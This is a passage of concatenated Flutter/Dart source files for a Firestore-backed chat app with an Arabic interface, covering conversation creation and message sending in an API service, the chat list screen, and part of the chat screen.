          .limit(1)
          .get();

      if (existingConversation.docs.isNotEmpty) {
        final doc = existingConversation.docs.first;
        final docId = doc.id;
        final data = doc.data() as Map<String, dynamic>?;
        final deletedForUsers = data?["deletedForUsers"] as Map<String, dynamic>?;

        // If it was deleted by the current user, undelete it by removing the flag.
        if (deletedForUsers != null && deletedForUsers[_currentAgentCode] == true) {
          _logger.info("ApiService:createOrGetConversation",
              "Found existing 2-party conversation $docId, previously deleted by $_currentAgentCode. Undeleting.");
          await _firestore.collection("conversations").doc(docId).update({
            "deletedForUsers.$_currentAgentCode": FieldValue.delete(), // Remove the flag
            "updatedAt": FieldValue.serverTimestamp()
          });
        }
        _logger.info("ApiService:createOrGetConversation",
            "Found/Reactivated existing 2-party conversation: $docId");
        return docId;
      }
    }

    _logger.info("ApiService:createOrGetConversation",
        "No existing suitable conversation found or it's a group chat. Creating new one.");
    final now = DateTime.now();

    final newConversation = ChatConversation(
      id: "", // Firestore will generate ID
      participants: allParticipantsSorted,
      participantInfo: finalParticipantInfoMap,
      conversationTitle: groupTitle ??
          (allParticipantsSorted.length > 2
              ? "مجموعة جديدة (${allParticipantsSorted.length})"
              : "محادثة"), // Default title
      lastMessageText: "تم إنشاء المحادثة.",
      lastMessageTimestamp: now,
      lastMessageSenderAgentCode: _currentAgentCode, // Or system message
      createdAt: now,
      updatedAt: now,
      deletedForUsers: {}, // Initialize with empty map
    );

    try {
      final docRef = await _firestore
          .collection("conversations")
          .add(newConversation.toFirestore());
      _logger.info("ApiService:createOrGetConversation",
          "Successfully created new conversation with ID: ${docRef.id}");
      return docRef.id;
    } catch (e, stackTrace) {
      _logger.error("ApiService:createOrGetConversation",
          "Failed to create new conversation in Firestore", e, stackTrace);
      return null;
    }
  }

  Future<void> sendMessage(
      String conversationId, ChatMessage messageToSend) async {
    _logger.info("ApiService:sendMessage",
        "Sending message to conversation $conversationId by agent $_currentAgentCode. Text: ${messageToSend.text ?? messageToSend.fileName ?? 'Attachment'}");

    if (conversationId.isEmpty || messageToSend.senderId != _currentAgentCode) {
      _logger.error("ApiService:sendMessage",
          "Invalid params: convId empty or senderId mismatch. ConvId: '$conversationId', Sender: '${messageToSend.senderId}', CurrentUser: '$_currentAgentCode'");
      return;
    }

    try {
      final messageData = messageToSend.toFirestore();
      messageData["timestamp"] = FieldValue.serverTimestamp(); // Use server timestamp for messages

      final messageDocRef = await _firestore
          .collection("conversations")
          .doc(conversationId)
          .collection("messages")
          .add(messageData);

      _logger.debug("ApiService:sendMessage",
          "Message document ${messageDocRef.id} added to conversation $conversationId.");

      // When a message is sent, ensure the conversation is not marked as deleted for any participant.
      // This effectively "un-deletes" the conversation for all participants if they send a message.
      Map<String, dynamic> updateData = {
        "lastMessageText":
            messageToSend.text ?? (messageToSend.fileName ?? "مرفق"),
        "lastMessageTimestamp": FieldValue.serverTimestamp(),
        "lastMessageSenderAgentCode": messageToSend.senderId,
        "updatedAt": FieldValue.serverTimestamp(),
        "deletedForUsers": {} // Clear all soft-delete flags for all users in this conversation
      };

      await _firestore.collection("conversations").doc(conversationId).update(updateData);
      _logger.info("ApiService:sendMessage",
          "Conversation $conversationId metadata updated and un-deleted for all participants.");
    } catch (e, stackTrace) {
      _logger.error(
          "ApiService:sendMessage",
          "Failed to send message to conversation $conversationId or update conversation metadata",
          e,
          stackTrace);
      rethrow;
    }
  }

  Future<bool> validateAgentCodeAgainstFirestore(
      String agentCodeToValidate) async {
    if (agentCodeToValidate.isEmpty) {
      _logger.warn("ApiService:validateAgentCode",
          "Attempted to validate an empty agent code.");
      return false;
    }
    _logger.info("ApiService:validateAgentCode",
        "Validating agent code: $agentCodeToValidate against 'agent_identities'");
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToValidate)
          .get();

      if (doc.exists) {
        _logger.info("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is VALID (document exists).");
        return true;
      } else {
        _logger.warn("ApiService:validateAgentCode",
            "Agent code '$agentCodeToValidate' is INVALID (document does not exist).");
        return false;
      }
    } catch (e, s) {
      _logger.error(
          "ApiService:validateAgentCode",
          "Error occurred while validating agent code '$agentCodeToValidate'",
          e,
          s);
      return false;
    }
  }
}




// ------------------------------ نهاية الملف: api_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_list_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_list_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_list_screen.dart
import "dart:async"; // For unawaited

import "package:cloud_firestore/cloud_firestore.dart"; 
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";

import "../../core/logging/logger_provider.dart";
// Import the whole file, as both ChatConversation and ChatParticipantInfo are used.
import "../../data/models/chat/chat_conversation.dart"; 
import "chat_screen.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/chat_list_item.dart";

final chatSearchQueryProvider = StateProvider<String>((ref) => "");

class ChatListScreen extends ConsumerStatefulWidget {
  const ChatListScreen({super.key});
  @override
  ConsumerState<ChatListScreen> createState() => _ChatListScreenState();
}

class _ChatListScreenState extends ConsumerState<ChatListScreen> {
  bool _isSearching = false;
  final TextEditingController _searchController = TextEditingController();
  bool _isFirstLoad = true; // Track first load to improve UX

  @override
  void initState() {
    super.initState();
    _searchController.addListener(() {
      if (mounted) {
        ref.read(chatSearchQueryProvider.notifier).state =
            _searchController.text;
      }
    });
    
    // Add a slight delay to make sure we've completed initialization
    Future.delayed(const Duration(milliseconds: 200), () {
      if (mounted) {
        setState(() {
          _isFirstLoad = false;
        });
      }
    });
  }

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  void _toggleSearch() {
    setState(() {
      _isSearching = !_isSearching;
      if (!_isSearching) {
        _searchController.clear();
        ref.read(chatSearchQueryProvider.notifier).state = "";
      }
    });
  }

  Future<ChatParticipantInfo?> _fetchAgentInfo(
      String agentCode, WidgetRef ref) async {
    final logger = ref.read(appLoggerProvider);
    final firestore = FirebaseFirestore.instance;
    logger.info("_fetchAgentInfo",
        "Fetching info for agent: $agentCode (direct Firestore access)");
    if (agentCode.isEmpty) return null;
    try {
      final doc =
          await firestore.collection("agent_identities").doc(agentCode).get();
      if (doc.exists) {
        final data = doc.data()!;
        return ChatParticipantInfo(
          agentCode: agentCode,
          displayName: data["displayName"] as String? ?? agentCode,
        );
      }
      logger.warn("_fetchAgentInfo", "Agent info not found for $agentCode.");
      return null;
    } catch (e, s) {
      logger.error(
          "_fetchAgentInfo", "Error fetching agent info for $agentCode", e, s);
      return null;
    }
  }

  void _createNewConversation() async {
    final apiService = ref.read(apiServiceProvider);
    final logger = ref.read(appLoggerProvider);
    final currentAgentCode =
        ref.read(currentAgentCodeProvider).value;
    final bool mainContextMounted = mounted; // Capture mounted state
    final theme = Theme.of(context); // Get theme for styling

    if (apiService == null ||
        currentAgentCode == null ||
        currentAgentCode.isEmpty) {
      logger.warn("ChatListScreen:createNewConversation",
          "ApiService or currentAgentCode is not available.");
      if (mainContextMounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("الخدمة غير متاحة أو لم يتم تسجيل الدخول.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    String? otherAgentCode = await showDialog<String>(
        context: context, 
        barrierDismissible: false, // Make dialog harder to dismiss accidentally
        builder: (dialogContext) {
          TextEditingController agentCodeController = TextEditingController();
          return AlertDialog(
            title: Text("بدء محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            content: Column(
              mainAxisSize: MainAxisSize.min, // Important for Column in AlertDialog
              children: [
                Text("الرجاء إدخال الرمز التعريفي للشخص الذي ترغب في بدء محادثة معه.", style: GoogleFonts.cairo(fontSize: 14)),
                const SizedBox(height: 15),
                TextField(
                  controller: agentCodeController,
                  decoration: InputDecoration(
                      hintText: "الرمز التعريفي للعميل الآخر",
                      hintStyle: GoogleFonts.cairo(),
                      border: const OutlineInputBorder(), // Add border for better visibility
                      prefixIcon: const Icon(Icons.person_search_outlined)
                  ),
                  style: GoogleFonts.cairo(),
                  autofocus: true, // Focus on the text field immediately
                ),
              ],
            ),
            actionsAlignment: MainAxisAlignment.spaceBetween, // Space out buttons
            actionsPadding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
            actions: [
              TextButton(
                  onPressed: () => Navigator.of(dialogContext).pop(),
                  child: Text("إلغاء", style: GoogleFonts.cairo(color: theme.colorScheme.error, fontWeight: FontWeight.bold))),
              ElevatedButton.icon(
                  icon: const Icon(Icons.send_outlined),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: theme.primaryColor,
                    foregroundColor: theme.colorScheme.onPrimary,
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12)
                  ),
                  onPressed: () {
                    final code = agentCodeController.text.trim();
                    if (code.isNotEmpty) {
                       Navigator.of(dialogContext).pop(code);
                    } else {
                      // Optionally show a small validation message within the dialog
                      ScaffoldMessenger.of(dialogContext).showSnackBar(
                        SnackBar(content: Text("الرجاء إدخال الرمز التعريفي.", style: GoogleFonts.cairo()), duration: const Duration(seconds: 2))
                      );
                    }
                  },
                  label: Text("بدء المحادثة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)))
            ],
          );
        });

    if (otherAgentCode == null || otherAgentCode.isEmpty) {
      logger.info("ChatListScreen:createNewConversation",
          "Dialog cancelled or no other agent code entered.");
      return;
    }

    if (otherAgentCode == currentAgentCode) {
      logger.info("ChatListScreen:createNewConversation",
          "Attempted to create chat with self.");
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لا يمكنك إنشاء محادثة مع نفسك بهذه الطريقة.",
                  style: GoogleFonts.cairo())),
        );
      }
      return;
    }

    // تحسين تجربة المستخدم بإظهار حالة تحميل مباشرة
    if (mounted) {
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext context) {
          return Dialog(
            child: Padding(
              padding: const EdgeInsets.all(20.0),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  CircularProgressIndicator(color: theme.primaryColor),
                  const SizedBox(width: 20),
                  Text("جاري إعداد المحادثة...", style: GoogleFonts.cairo()),
                ],
              ),
            ),
          );
        },
      );
    }

    try {
      final otherAgentInfo = await _fetchAgentInfo(otherAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (otherAgentInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:createNewConversation",
            "Agent $otherAgentCode not found or error fetching info.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text("لم يتم العثور على عميل بالرمز: $otherAgentCode",
                  style: GoogleFonts.cairo())),
        );
        return;
      }

      final currentUserInfo = await _fetchAgentInfo(currentAgentCode, ref);
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;

      if (currentUserInfo == null) {
        Navigator.of(context).pop(); // إغلاق نافذة التحميل
        logger.error("ChatListScreen:CreateNewConversation",
            "Failed to fetch current user ($currentAgentCode) info. This should not happen if login was successful.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("خطأ في جلب معلومات المستخدم الحالي.",
                style: GoogleFonts.cairo())
          )
        );
        return;
      }

      final Map<String, ChatParticipantInfo> participantsInfoMap = {
        currentAgentCode: currentUserInfo,
        otherAgentCode: otherAgentInfo,
      };

      final newConversationId =
          await apiService.createOrGetConversationWithParticipants(
        [otherAgentCode],
        participantsInfoMap,
      );
      
      // تحقق مرة أخرى من الـ mounted قبل المتابعة
      if (!mounted) return;
      Navigator.of(context).pop(); // إغلاق نافذة التحميل

      if (newConversationId != null) {
        logger.info("ChatListScreen",
            "Successfully created/retrieved conversation: $newConversationId");
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => ChatScreen(
              conversationId: newConversationId,
              conversationTitle: otherAgentInfo.displayName,
            ),
          ),
        );
      } else {
        logger.warn("ChatListScreen",
            "Failed to create/retrieve conversation with $otherAgentCode.");
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content: Text(
                  "فشل إنشاء/جلب المحادثة. قد تكون المشكلة في الاتصال أو البيانات.",
                  style: GoogleFonts.cairo())),
        );
      }
    } catch (e, stackTrace) {
      if (mounted) Navigator.of(context).pop(); // إغلاق نافذة التحميل عند حدوث خطأ
      logger.error("ChatListScreen:createNewConversation",
          "Error during conversation creation/retrieval", e, stackTrace);
      if (mounted) { 
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
              content:
                  Text("حدث خطأ: ${e.toString()}", style: GoogleFonts.cairo())),
        );
      }
    }
  }

  // دالة لعرض المحتوى المناسب عند عدم وجود محادثات
  Widget _buildEmptyConversationsView(BuildContext context) {
    final theme = Theme.of(context);
    
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.chat_bubble_outline_rounded, 
              size: 80, 
              color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد محادثات حتى الآن",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "يمكنك بدء محادثة جديدة مع أي شخص باستخدام الزر أدناه",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          ElevatedButton.icon(
            icon: const Icon(Icons.add_comment_outlined),
            label: Text("بدء محادثة جديدة", 
                       style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
            onPressed: _createNewConversation,
            style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: theme.colorScheme.onPrimary,
                padding: const EdgeInsets.symmetric(
                    horizontal: 24, vertical: 12),
                textStyle: GoogleFonts.cairo(fontSize: 16, fontWeight: FontWeight.bold),
                elevation: 2,
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض نتيجة بحث فارغة
  Widget _buildEmptySearchResults(String query) {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.search_off_rounded, 
               size: 80, 
               color: Colors.grey[400]),
          const SizedBox(height: 20),
          Text(
            "لا توجد نتائج بحث تطابق \"$query\"",
            style: GoogleFonts.cairo(
                fontSize: 18, 
                color: Colors.grey[600],
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 16),
          Text(
            "حاول استخدام كلمات مفتاحية مختلفة",
            style: GoogleFonts.cairo(
                fontSize: 14, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final conversationsAsyncValue = ref.watch(chatConversationsStreamProvider);
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);
    final currentSearchQuery = ref.watch(chatSearchQueryProvider).toLowerCase();

    if (agentCodeAsync.isLoading) {
      return const Scaffold(
          body: Center(child: CircularProgressIndicator()));
    }
    if (agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      return Scaffold(
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل بيانات المصادقة.\nالرجاء المحاولة مرة أخرى لاحقًا."
                  : "الرجاء تسجيل الدخول للوصول إلى قسم الدردشات.",
              style: GoogleFonts.cairo(fontSize: 17, color: Colors.grey[700]),
              textAlign: TextAlign.center,
            ),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: theme.scaffoldBackgroundColor,
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 8, 8, 8), 
              child: Row(
                children: [
                  Expanded(
                    child: _isSearching
                        ? TextField(
                            controller: _searchController,
                            autofocus: true,
                            style: GoogleFonts.cairo(color: theme.textTheme.bodyLarge?.color ?? (theme.brightness == Brightness.dark ? Colors.white : Colors.black)),
                            decoration: InputDecoration(
                              hintText: "بحث في الدردشات...",
                              hintStyle: GoogleFonts.cairo(color: theme.hintColor),
                              border: InputBorder.none, 
                            ))
                        : Text("الدردشات", style: GoogleFonts.cairo(fontSize: 20, fontWeight: FontWeight.bold, color: theme.textTheme.titleLarge?.color)),
                  ),
                  IconButton(
                    icon: Icon(_isSearching ? Icons.close : Icons.search_outlined, color: theme.iconTheme.color),
                    tooltip: _isSearching ? "إغلاق البحث" : "بحث",
                    onPressed: _toggleSearch,
                  ),
                  if (!_isSearching)
                    IconButton(
                      icon: Icon(Icons.refresh_outlined, color: theme.iconTheme.color),
                      tooltip: "تحديث",
                      onPressed: () {
                        unawaited(ref.refresh(chatConversationsStreamProvider.future));
                        logger.info("ChatListScreen",
                            "Manually refreshed conversations stream.");
                        if (_isSearching) _toggleSearch();
                        _searchController.clear();
                      },
                    ),
                ],
              ),
            ),
            Expanded(
              child: conversationsAsyncValue.when(
                data: (conversations) {
                  final filteredConversations = currentSearchQuery.isEmpty
                      ? conversations
                      : conversations.where((conv) {
                          return conv.conversationTitle
                                  .toLowerCase()
                                  .contains(currentSearchQuery) ||
                              (conv.lastMessageText ?? "")
                                  .toLowerCase()
                                  .contains(currentSearchQuery);
                        }).toList();

                  // عرض رسالة فارغة مناسبة
                  if (filteredConversations.isEmpty) {
                    if (currentSearchQuery.isNotEmpty) {
                      return _buildEmptySearchResults(currentSearchQuery);
                    } else {
                      return _buildEmptyConversationsView(context);
                    }
                  }
                  
                  return ListView.separated(
                    padding: const EdgeInsets.symmetric(vertical: 8.0),
                    itemCount: filteredConversations.length,
                    itemBuilder: (context, index) {
                      final conversation = filteredConversations[index];
                      return ChatListItem(
                        conversation: conversation,
                        onTap: () {
                          Navigator.push(
                            context,
                            MaterialPageRoute(
                              builder: (context) => ChatScreen(
                                conversationId: conversation.id,
                                conversationTitle: conversation.conversationTitle,
                              ),
                            ),
                          );
                        },
                      );
                    },
                    separatorBuilder: (context, index) => Divider(
                      height: 0.5,
                      indent: 75,
                      endIndent: 15,
                      color: theme.brightness == Brightness.dark
                          ? Colors.grey[700]
                          : Colors.grey[300],
                    ),
                  );
                },
                loading: () => _isFirstLoad 
                  ? Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          CircularProgressIndicator(color: theme.primaryColor),
                          const SizedBox(height: 16),
                          Text(
                            "جاري تحميل المحادثات...",
                            style: GoogleFonts.cairo(fontSize: 16, color: theme.primaryColor),
                          )
                        ],
                      ))
                  : const Center(child: CircularProgressIndicator()),
                error: (err, stack) {
                  logger.error(
                      "ChatListScreen:StreamBuilder", "Error in stream UI", err, stack);
                  return Center(
                      child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.error_outline_rounded, 
                             size: 60, 
                             color: Colors.red[300]),
                        const SizedBox(height: 16),
                        Text(
                          "حدث خطأ أثناء تحميل المحادثات",
                          style: GoogleFonts.cairo(
                              fontSize: 18, 
                              color: Colors.red[400],
                              fontWeight: FontWeight.w600),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 8),
                        Text(
                          "الرجاء المحاولة مرة أخرى لاحقًا",
                          style: GoogleFonts.cairo(color: Colors.grey[600], fontSize: 14),
                          textAlign: TextAlign.center,
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton.icon(
                          onPressed: () => ref.refresh(chatConversationsStreamProvider),
                          icon: const Icon(Icons.refresh_rounded),
                          label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: theme.primaryColor,
                            foregroundColor: Colors.white,
                          ),
                        )
                      ],
                    ),
                  ));
                },
              ),
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _createNewConversation,
        backgroundColor: theme.primaryColor,
        foregroundColor: theme.colorScheme.onPrimary,
        tooltip: "بدء محادثة جديدة",
        icon: const Icon(Icons.add_comment_outlined),
        label: Text("محادثة جديدة", style: GoogleFonts.cairo(fontWeight: FontWeight.bold)),
        elevation: 3,
      ),
    );
  }
}


// ------------------------------ نهاية الملف: chat_list_screen.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: chat_screen.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\chat_screen.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/chat_screen.dart
import "package:file_picker/file_picker.dart";
import "package:flutter/material.dart";
import "package:flutter/services.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:mime/mime.dart"; // For looking up MIME types

import "../../core/logging/logger_provider.dart";
import "../../data/models/chat/chat_message.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import "widgets/message_bubble.dart";
import "widgets/message_input_bar.dart";

class ChatScreen extends ConsumerStatefulWidget {
  final String conversationId;
  final String conversationTitle; 
  final bool showAppBar;

  const ChatScreen({
    super.key,
    required this.conversationId,
    required this.conversationTitle,
    this.showAppBar = true, 
  });

  @override
  ConsumerState<ChatScreen> createState() => _ChatScreenState();
}

class _ChatScreenState extends ConsumerState<ChatScreen> {
  bool _isInitializing = true;

  @override
  void initState() {
    super.initState();
    // تأخير قليل جداً لإظهار حالة تحميل أفضل
    Future.delayed(const Duration(milliseconds: 300), () {
      if (mounted) {
        setState(() {
          _isInitializing = false;
        });
      }
    });
  }

  MessageType _determineMessageTypeFromFile(PlatformFile file) {
    final mimeType = lookupMimeType(file.name, headerBytes: file.bytes?.take(1024).toList());
    final extension = file.extension?.toLowerCase();
    
    if (mimeType != null) {
        if (mimeType.startsWith("image/")) return MessageType.image;
        if (mimeType.startsWith("video/")) return MessageType.video;
        if (mimeType.startsWith("audio/")) return MessageType.audio;
    }
    // Fallback to extension if MIME type is generic or missing
    if (extension == null) {
      return MessageType.file; 
    }
    switch (extension) {
      case "jpg":
      case "jpeg":
      case "png":
      case "gif":
      case "webp":
      case "bmp":
        return MessageType.image;
      case "mp4":
      case "mov":
      case "avi":
      case "mkv":
      case "webm":
        return MessageType.video;
      case "mp3":
      case "wav":
      case "aac":
      case "ogg":
      case "m4a":
        return MessageType.audio;
      default:
        return MessageType.file;
    }
  }

  void _onMessageLongPress(
      BuildContext context, ChatMessage message, WidgetRef ref) {
    final logger = ref.read(appLoggerProvider);
    final currentTheme = Theme.of(context);

    showModalBottomSheet(
        context: context,
        backgroundColor: currentTheme.bottomSheetTheme.modalBackgroundColor ??
            currentTheme.cardColor,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        builder: (ctx) {
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 10.0),
            child: Wrap(
              children: <Widget>[
                Center(
                  child: Container(
                    width: 40,
                    height: 5,
                    margin: const EdgeInsets.only(top: 8, bottom: 12),
                    decoration: BoxDecoration(
                        color: Colors.grey[400],
                        borderRadius: BorderRadius.circular(10)),
                  ),
                ),
                if (message.text != null && message.text!.isNotEmpty)
                  ListTile(
                    leading: Icon(Icons.copy_all_outlined,
                        color: currentTheme.colorScheme.primary),
                    title: Text("نسخ النص",
                        style: GoogleFonts.cairo(fontSize: 16)),
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: message.text!));
                      Navigator.of(ctx).pop();
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Text("تم نسخ النص إلى الحافظة",
                              style: GoogleFonts.cairo()),
                          behavior: SnackBarBehavior.floating, 
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                        ),
                      );
                      logger.info("ChatScreen:MessageMenu",
                          "Copied message text: ${message.id}");
                    },
                  ),
              ],
            ),
          );
        });
  }

  // دالة لعرض حالة تحميل محسنة
  Widget _buildLoadingState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          CircularProgressIndicator(color: theme.primaryColor),
          const SizedBox(height: 20),
          Text(
            "جاري إعداد المحادثة...",
            style: GoogleFonts.cairo(
              fontSize: 16,
              color: theme.primaryColor,
              fontWeight: FontWeight.w500
            ),
          ),
        ],
      ),
    );
  }

  // دالة لعرض حالة الخطأ بشكل محسن
  Widget _buildErrorState(String errorMsg, WidgetRef ref) {
    final theme = Theme.of(context);
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.error_outline_rounded,
                color: Colors.red[300], size: 60),
            const SizedBox(height: 15),
            Text(
              "حدث خطأ أثناء تحميل المحادثة",
              style: GoogleFonts.cairo(
                  color: Colors.red[400], 
                  fontSize: 18,
                  fontWeight: FontWeight.w600),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 8),
            Text(
              errorMsg,
              style: GoogleFonts.cairo(
                  color: Colors.grey[600], fontSize: 14),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              icon: const Icon(Icons.refresh_rounded),
              label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
              onPressed: () => ref.invalidate(
                  chatMessagesStreamProvider(widget.conversationId)),
              style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              ),
            )
          ],
        ),
      ),
    );
  }

  // دالة لعرض حالة الرسائل الفارغة
  Widget _buildEmptyMessagesState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.forum_outlined,
              size: 100,
              color: theme.colorScheme.primary.withOpacity(0.6)),
          const SizedBox(height: 20),
          Text(
            "ابدأ المحادثة!",
            style: GoogleFonts.cairo(
                fontSize: 22,
                color: theme.colorScheme.onSurface,
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "لا توجد رسائل في هذه المحادثة بعد\nأرسل أول رسالة للبدء",
            style: GoogleFonts.cairo(
                fontSize: 16, 
                color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 12),
          Icon(
            Icons.arrow_downward_rounded,
            color: theme.primaryColor.withOpacity(0.7),
            size: 32,
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final messagesAsyncValue =
        ref.watch(chatMessagesStreamProvider(widget.conversationId));
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);

    if (_isInitializing) {
      return Scaffold(
        appBar: widget.showAppBar 
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: _buildLoadingState(context),
      );
    }

    if (agentCodeAsync.isLoading ||
        agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      Widget bodyContent;
      if (agentCodeAsync.isLoading) {
        bodyContent = _buildLoadingState(context);
      } else {
        bodyContent = Center(
          child: Padding(
            padding: const EdgeInsets.all(20.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل معلومات المستخدم للدردشة."
                  : "الرجاء تسجيل الدخول لعرض الرسائل.",
              style: GoogleFonts.cairo(fontSize: 16, color: Colors.grey[600]),
              textAlign: TextAlign.center,
            ),
          ),
        );
      }
      return Scaffold(
        appBar: widget.showAppBar
            ? AppBar(title: Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: bodyContent,
      );
    }

    final currentAgentCode = agentCodeAsync.value!;

    return Scaffold(
      appBar: widget.showAppBar
          ? AppBar(
              title: Text(widget.conversationTitle, style: GoogleFonts.cairo()),
              backgroundColor: theme.appBarTheme.backgroundColor ??
                  theme.colorScheme.primary,
              elevation: theme.appBarTheme.elevation ?? 1.0,
              actions: [
                IconButton(
                  icon: const Icon(Icons.refresh_outlined),
                  tooltip: "تحديث الرسائل",
                  onPressed: () {
                    ref.invalidate(chatMessagesStreamProvider(widget.conversationId));
                    logger.info("ChatScreen",
                        "Manually refreshed messages for ${widget.conversationId}");
                  },
                ),
              ],
            )
          : null, 
      body: Column(
        children: [
          Expanded(
            child: messagesAsyncValue.when(
              data: (messages) {
                if (messages.isEmpty) {
                  return _buildEmptyMessagesState(context);
                }
                return ListView.builder(
                  reverse: true,
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10.0, vertical: 15.0),
                  itemCount: messages.length,
                  itemBuilder: (context, index) {
                    final message = messages[messages.length - 1 - index];
                    return GestureDetector(
                      onLongPress: () =>
                          _onMessageLongPress(context, message, ref),
                      child: MessageBubble(
                        message: message,
                      ),
                    );
                  },
                );
              },
              loading: () => _buildLoadingState(context),
              error: (err, stack) {
                logger.error("ChatScreen:StreamBuilder",
                    "Error UI msg for ${widget.conversationId}", err, stack);
                return _buildErrorState(
                    "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى", ref);
              },
            ),
          ),
          MessageInputBar(
            onSendPressed: (text) async {
              if (text.trim().isNotEmpty) {
                final apiService = ref.read(apiServiceProvider);
                if (apiService == null) {
                  logger.error("ChatScreen:onSendPressed",
                      "ApiService is null. Cannot send message.");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
